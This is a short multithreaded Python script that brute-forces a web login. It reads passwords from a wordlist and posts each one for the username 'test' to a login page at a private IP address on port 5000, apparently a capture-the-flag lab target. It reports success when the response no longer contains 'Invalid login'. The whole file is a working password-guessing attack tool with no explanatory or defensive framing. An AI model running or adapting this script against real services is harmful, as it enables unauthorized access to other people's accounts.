#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import os
import re
import time
import requests as req
import sys
import codecs
import traceback

import threading
import queue


def main():
    if len(sys.argv) <= 1:
        exit(1)

    # args parse
    wordlist_file = sys.argv[1]
    thread_cnt = 1
    if len(sys.argv) >= 3:
        thread_cnt = sys.argv[2]

    if not os.access(wordlist_file, os.R_OK):
        print(f"{wordlist_file} is not readable.")
        exit(1)

    global que

    fh = codecs.open(wordlist_file, "r", "utf-8")
    for password in [word.strip() for word in fh if not word.strip() == '']:
        que.put(password)

    for x in range(int(thread_cnt)):
        trd = threading.Thread(target = brute)
        trd.start()


def brute() -> None:
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://10.10.11.160:5000',
            'Referer': 'http://10.10.11.160:5000/login'
            }
    url = "http://10.10.11.160:5000/login"

    global quit_flag
    global que
    trd_id = threading.currentThread().ident
    while not que.empty():
        if quit_flag:
            break

        password = que.get()
        try:
            # x-www-form-urlencoded
            params = {
                    'username': 'test',
                    'password': password
                    }

            # do request
            res = req.post(url, data = params, headers = headers, timeout = 50)

            #print(res.text)
            if res.text.find("Invalid login") == -1:
                # have no result : correct password
                print(f"\033[32m{trd_id}: found password: {password} \033[0m")
                quit_flag = True
            else:
                print(f"{trd_id}: {password} not correct")

        except Exception as why:
            traceback.print_exc()
            exit(1)


if __name__ == '__main__':
    quit_flag = False
    que = queue.Queue()
    main()
